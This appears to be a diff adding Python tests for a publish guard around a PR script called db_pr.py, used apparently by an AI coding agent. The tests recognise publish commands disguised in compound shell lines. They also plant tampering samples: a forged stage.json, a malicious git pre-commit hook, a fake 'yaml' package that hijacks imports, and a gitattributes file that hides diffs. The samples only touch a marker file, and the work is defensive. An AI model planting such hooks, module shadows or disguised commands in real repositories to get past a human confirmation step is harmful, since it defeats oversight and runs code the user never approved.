+    ("other-install", "b", f"python3 /other/plugin/scripts/db_pr.py publish {_R}", 1, 0),
+    ("stage", "b", "python3 /p/scripts/db_pr.py --platform android stage /w/ABC-1/plan.json --wt /w/ABC-1/wt --branch b", 0, 1),
+    ("discard", "b", "python3 /p/scripts/db_pr.py discard /w/ABC-1/wt", 0, 1),
+    # publish가 섞인 명령은 통째로 붙여 넣지 않는다 — owner 줄을 내지 않는다(재확인 RR2-1)
+    ("discard;publish", "b", f"python3 /p/scripts/db_pr.py discard /w/ABC-1/wt; python3 /p/scripts/db_pr.py publish {_R}", 1, 0),
+    ("abbrev-plat", "b", f"python3 /p/scripts/db_pr.py --plat android publish {_R}", 1, 0),
+    ("bash-lc", "b", f"bash -lc \"python3 /p/scripts/db_pr.py publish {_R}\"", 1, 0),
+    ("cat;publish", "b", f"cat /p/scripts/db_pr.py; python3 /p/scripts/db_pr.py publish {_R}", 1, 0),
+    ("grep&&stage", "b", "grep -c x /p/scripts/db_pr.py && python3 /p/scripts/db_pr.py stage --wt /w/ABC-1/wt", 0, 1),
+    ("t-mention", "t", "게시는 db_pr.py publish로 하지 않습니다. 확인 화면까지 했습니다.", 0, 0),
+    ("t-publish-status", "t", "`db_pr.py publish-status`를 확인하세요.", 0, 0),
+    ("t-inline", "t", "다음은 db_pr.py publish 단계입니다.", 1, 0),     # 설명 속 낱말도 — 안내 한 줄이 더할 뿐
+    ("t-line-continuation", "t", "```sh\npython3 /p/scripts/db_pr.py \\\n  --platform android \\\n  publish " + _R + "\n```", 1, 0),
+    ("t-newline", "t", "python3 /p/scripts/db_pr.py\npublish " + _R, 1, 0),
+    ("t-platform-before", "t", f"```sh\npython3 /p/scripts/db_pr.py --platform android publish {_R}\n```", 1, 0),
+    ("t-unbalanced-quote", "t", f"모델's 명령: python3 /p/scripts/db_pr.py --platform android publish {_R}", 1, 0),
+    ("t-no-py", "t", "다음: `db_pr publish` 를 돌린다", 0, 0),
+    ("t-none", "t", "확인 화면까지 했습니다. 승인하면 등록합니다.", 0, 0),
+]
+
+
+@pytest.mark.parametrize("kind,text,pub,own", [c[1:] for c in PUBLISH_FORMS], ids=[c[0] for c in PUBLISH_FORMS])
+def test_publish_hint_reads_the_db_pr_subcommand_word(env, kind, text, pub, own):
+    """재리뷰 RR-1: `게시:` 줄과 publish의 owner 안내 생략은 같은 판정(`db_pr.py` 뒤 낱말에서 옵션과 그 값을 건너뛴 하위 명령)을 쓴다 —
+    `--platform x publish`·`--json publish`·줄 이음도 `게시:` 한 줄이고 owner 안내가 없다. stage·discard 안내는 그대로. 열림·닫힘 모두."""
+    _state(env["work"], "ABC-1", OWN)
+    _hold_lock(env["work"], "ABC-1", OWN)
+    for publish in (None, "open"):
+        if publish:
+            write_meta(env["proj"], env["plug"], env["work"], publish=publish)
+        if kind == "b":
+            out = _handoff(env, text)
+        else:
+            events(env, final(text))
+            out = tt(env, "--", "x").stdout
+        lines = out.splitlines()
+        assert len([x for x in lines if x.startswith("게시:")]) == pub, (publish, out)
+        assert len([x for x in lines if x.startswith("주의:") and "TT_LOCK_OWNER" in x]) == own, (publish, out)
+
+
+# 통합:실제 db_pr(clone·bare 원격·hook·gh 스텁)에서 모델이 stage까지 한 analyze 작업 → tt-oc publish → 원격에 브랜치·PR.
+# 회귀: (H1) 위조한 stage.json(pending_sources에 작업 밖 파일, 가짜 검사 결과)은 재stage로 사라진다 (H2) wt/.githooks/pre-commit을
+# 바꿔도 재stage가 되돌려 그 코드가 돌지 않는다. (리뷰 6 F-P0) wt에 심은 무시된 파일 — hook이 cwd에서 import하는 가짜 `yaml/`,
+# 실행 비트가 있는 `.githooks/post-commit` — 은 화면 전에 지워지고, 화면 뒤에 심으면 거부. (F-P1) 원격에 남의 커밋이 있으면 그 작성자·
+# 제목을 보이고, 작업 키만으로는 덮어쓰지 않는다.
+FAKE_YAML = """import os, sys
+open({marker!r}, "a").close()
+here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path[:] = [p for p in sys.path if os.path.abspath(p or os.curdir) != here]
+del sys.modules[__name__]
+import yaml                     # 진짜 PyYAML을 다시 내보낸다 — hook은 그대로 통과한다
+"""
+
+
+def _plant(wt, kind, marker):
+    """무시된(`.gitignore` `*`) 파일을 wt에 심는다: `yaml`(cwd import) 또는 `post-commit`(실행 비트 hook)."""
+    d = wt / ("yaml" if kind == "yaml" else ".githooks")
+    d.mkdir(exist_ok=True)
+    (d / ".gitignore").write_text("*\n", encoding="utf-8")
+    if kind == "yaml":
+        (d / "__init__.py").write_text(FAKE_YAML.format(marker=str(marker)), encoding="utf-8")
+    else:
+        (d / "post-commit").write_text(f"#!/bin/sh\ntouch '{marker}'\n", encoding="utf-8")
+        (d / "post-commit").chmod(0o755)
+
+
+@PTY
+@pytest.mark.parametrize("forge", [None, "stage-json", "pre-commit", "ignored-yaml", "ignored-hook", "after-screen",
+                                   "remote-commit", "ignored-attr"])
+def test_publish_integration_real_db_pr(tmp_path, forge):
+    import mock_env
+    from runner import variant_db
+    from workspace import PLANS, Workspace, git
+    ws = Workspace()
+    attr = forge == "ignored-attr"      # 새 원인(type.md 본문이 화면 diff에 보여야 한다)
+    job = "MOCK-7002" if attr else "MOCK-7001"
+    br = f"issue/{job}"
+    plan = json.loads((PLANS / f"p7-analyze-{'new-cause' if attr else 'append'}.plan.json").read_text(encoding="utf-8"))
+    other = None
+    if forge == "remote-commit":      # 다른 clone이 올린 커밋(hook 없이 원격에 바로), 모델이 계획 pr.head_sha를 그것으로 맞춘다
+        other = git(ws.remote, "-c", "user.name=Other Dev", "-c", "user.email=other@ghe.mock.invalid", "commit-tree",
+                    "main^{tree}", "-p", "main", "-m", "남의 커밋").strip()
+        git(ws.remote, "update-ref", f"refs/heads/{br}", other)
+        plan["pr"]["head_sha"] = other
+    ws.plan(job, plan)
+    if attr:
+        ws.put(job, "fixtures/cut-1.log",
+               variant_db("issue-db-pending") / "data/DATA-001-no-setup-data-call/fixtures/DATA-001-03.log")
+    owner = ws.acquire(job)["lock"]["owner"]
+    (ws.job_dir(job) / "triage-state.json").write_text(json.dumps({"owner": owner}), encoding="utf-8")
+    proc = ws.run("db_pr.py", ["stage", ws.job_dir(job) / "plan.json", "--wt", ws.wt(job), "--branch", br, "--then-summary"],
+                  env={"TT_LOCK_OWNER": owner})
+    assert proc.returncode in (0, 3), proc.stderr
+    if attr:      # 무시된 `.gitattributes`(`* -diff`)가 재stage에 남으면 화면의 type.md가 `Binary files … differ`로 가려진다
+        d = ws.wt(job) / "data" / "DATA-001-no-setup-data-call"
+        (d / ".gitattributes").write_text("* -diff\n", encoding="utf-8")
+        (d / ".gitignore").write_text(".git*\n", encoding="utf-8")
+    victim, marker = tmp_path / "victim.yaml", tmp_path / "PWNED"
+    if forge == "stage-json":
+        victim.write_text("x: 1\n", encoding="utf-8")
+        sj = json.loads((ws.job_dir(job) / "stage.json").read_text(encoding="utf-8"))
+        sj["pending_sources"] = [str(victim)]
+        sj["checks"] = {"forged": {"code": 0, "result": "FORGED-OK"}}
+        (ws.job_dir(job) / "stage.json").write_text(json.dumps(sj), encoding="utf-8")
+    if forge == "pre-commit":
+        hook = ws.wt(job) / ".githooks" / "pre-commit"
+        hook.write_text(f"#!/bin/sh\ntouch {marker}\nexit 0\n", encoding="utf-8")
+        hook.chmod(0o755)
+    if forge in ("ignored-yaml", "ignored-hook"):
+        _plant(ws.wt(job), forge[len("ignored-"):], marker)
+    seen = []
+
+    def on_prompt(n):
+        if n == 0:
+            seen.append((ws.wt(job) / "yaml").exists() or (ws.wt(job) / ".githooks" / "post-commit").exists())
+            if forge == "after-screen":
+                _plant(ws.wt(job), "yaml", marker)
+    proj = tmp_path / "proj"
+    (proj / ".opencode" / "plugins").mkdir(parents=True)
+    (proj / "opencode.json").write_text("{}", encoding="utf-8")
+    (proj / ".opencode" / "plugins" / "tt-guard.js").write_text("// guard\n", encoding="utf-8")
+    write_meta(proj, ws.root, ws.work, publish="open")
+    env = {**mock_env.env_with_mocks(plugin_root=ws.root, gh_state_dir=ws.gh_state), **ws.env()}
+    env = {k: str(v) for k, v in env.items()
+           if k not in ("CLAUDECODE", "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE") and not k.startswith(("TT_", "GIT_CONFIG"))}
+    code, out = pty_tt(env, proj, "publish", answers=[job, None], on_prompt=on_prompt, timeout=600)
+    assert seen == [False], out                              # 화면 때 wt에 심은 무시 파일이 없다
+    assert not marker.exists(), out
+    if forge == "after-screen":
+        assert code == 2 and "화면 뒤에 wt에 무시된 파일이 생겼다" in out and f"{S}yaml/" in out, out
+        assert not ws.prs() and br not in git(ws.remote, "branch", "--list", br)
+        return
+    if forge == "remote-commit":
+        assert code == 0 and "게시하지 않았다" in out and f"{other[:7]} · Other Dev <other@ghe.mock.invalid> · " in out, out
+        assert " · 남의 커밋\n" in out and git(ws.remote, "rev-parse", f"refs/heads/{br}").strip() == other
+        assert not ws.prs()
+        return
+    assert code == 0, out
+    if attr:
+        assert "Binary files" not in out and "title: SIM 미준비" in out, out
+    assert "게시했다" in out and ws.remote_files(br) and len(ws.prs()) == 1, out
+    assert not ws.wt(job).exists()                          # --and-discard
+    assert victim.is_file() == (forge == "stage-json") and "FORGED-OK" not in out
